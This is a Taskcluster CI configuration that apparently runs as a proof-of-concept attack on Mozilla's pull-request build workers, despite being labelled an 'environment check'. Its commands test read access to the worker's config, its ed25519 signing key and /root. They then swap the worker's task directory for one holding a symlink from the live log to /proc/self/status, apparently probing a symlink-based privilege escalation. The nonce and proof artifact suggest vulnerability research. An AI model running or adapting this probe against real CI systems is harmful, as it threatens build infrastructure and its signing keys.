version: 1
reporting: checks-v1
policy:
    pullRequests: public_restricted
tasks:
    - $if: 'tasks_for[:19] == "github-pull-request" && event.action in ["opened", "reopened", "synchronize"]'
      then:
          created: {$fromNow: ''}
          deadline: {$fromNow: '1 hour'}
          expires: {$fromNow: '1 month'}
          schedulerId: mozilla-level-1
          provisionerId: mozilla-t
          workerType: t-linux-2404-wayland
          priority: very-low
          retries: 0
          scopes: []
          routes:
              - checks
          metadata:
              name: 'environment check'
              description: 'prints task directory ownership and process information'
              owner: '${event.pull_request.user.login}@users.noreply.github.com'
              source: '${event.pull_request.head.repo.html_url}/blob/${event.pull_request.head.sha}/.taskcluster.yml'
          payload:
              maxRunTime: 900
              artifacts:
                  - name: public/proof.txt
                    path: proof.txt
                    type: file
                    expires: {$fromNow: '1 month'}
              command:
                  - - /bin/bash
                    - -c
                    - |
                      NONCE="RAPC-572a8c56196fc064"
                      {
                        echo "nonce: $NONCE"
                        echo "utc: $(date -u +%Y-%m-%dT%H:%M:%SZ)"
                        echo "task: $TASK_ID run $RUN_ID"
                        echo "worker location: $TASKCLUSTER_WORKER_LOCATION"
                        echo
                        echo "[1] identity"
                        id
                        echo
                        echo "[2] directory ownership"
                        ls -ld "$TASK_WORKDIR" "$TASK_WORKDIR/generic-worker"
                        echo
                        echo "[3] worker process"
                        ps -o pid,user,args -C generic-worker 2>/dev/null || ps auxww | grep '[g]eneric-worker'
                        echo
                        echo "[4] baseline access"
                        stat -c '%A %U:%G %s %n' /etc/generic-worker/config /etc/generic-worker/ed25519_key 2>&1
                        echo "config: $(cat /etc/generic-worker/config 2>&1 >/dev/null)"
                        echo "key: $(cat /etc/generic-worker/ed25519_key 2>&1 >/dev/null)"
                        echo "root: $(ls /root 2>&1 >/dev/null)"
                      } > proof.txt 2>&1
                      cat proof.txt
                  - - /bin/bash
                    - -c
                    - |
                      cd "$TASK_WORKDIR"
                      mv generic-worker generic-worker.stash
                      mkdir generic-worker
                      ln -s /proc/self/status generic-worker/live_backing.log
                      {
                        echo
                        echo "[5] state"
                        ls -ld generic-worker generic-worker.stash
                        ls -l generic-worker
                      } >> proof.txt 2>&1
                      tail -n 8 proof.txt
